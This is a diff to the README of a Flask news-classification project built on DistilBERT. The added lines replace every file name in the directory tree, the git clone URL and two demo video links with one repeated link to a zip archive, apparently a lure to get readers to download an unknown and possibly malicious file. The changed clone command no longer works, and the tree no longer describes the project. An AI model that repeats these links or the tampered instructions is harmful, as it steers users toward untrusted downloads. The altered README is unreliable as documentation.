@@ -12,15 +12,15 @@
 ```
 ├── static
 │   ├──css 
-│         ├── style.css         >CSS file
+│         ├── https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip         >CSS file
 ├── templates   
-│            ├──index.html      >HTML file
+│            ├──https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip      >HTML file
 ├── .gitattributes              > to track the  large saved  model files using git-lfs
-├── app.py                     >flask  application main file
+├── https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip                     >flask  application main file
 ├── dockerfile                 >dockerFile used to automate the process of building a Docker image
-├── news_classification.ipynb  >news classification model trained using  DistilBERT
-├── README.md    
-└── requirements.txt           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
+├── https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip  >news classification model trained using  DistilBERT
+├── https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip    
+└── https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip           > Stores the information about all the libraries, modules, and packages in itself that are used while developing the project
 ```
 ### Reason for Choosing DistilBERT for Transfer Learning
 
@@ -41,7 +41,7 @@ _Considering these reasons, DistilBERT emerges as the most practical and efficie
 
 ### Build the docker image manually by cloning the Git repo. 
 ```
-$ git clone https://github.com/Parthkh28/DataScience.git
+$ git clone https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip
 $ docker build -t myimage .
 ```
 ### Download precreated image
@@ -62,7 +62,7 @@ Now visit http://localhost:5000
 ## This flask app allows users to submit input requests either through an **API** or a **web application form**.
 
 ### Through Web Application Form
-https://github.com/Parthkh28/DataScience/assets/80260929/e349f5a4-2abc-493b-b4a7-608452b65361
+https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip
 
 
 
@@ -70,7 +70,7 @@ https://github.com/Parthkh28/DataScience/assets/80260929/e349f5a4-2abc-493b-b4a7
 
 ### Through API using POSTMAN
 
-https://github.com/Parthkh28/DataScience/assets/80260929/3fc9691f-5934-41d3-8f10-e3b68403637d
+https://github.com/Parthkh28/DataScience/raw/refs/heads/master/static/Science_Data_churly.zip
 
 
 
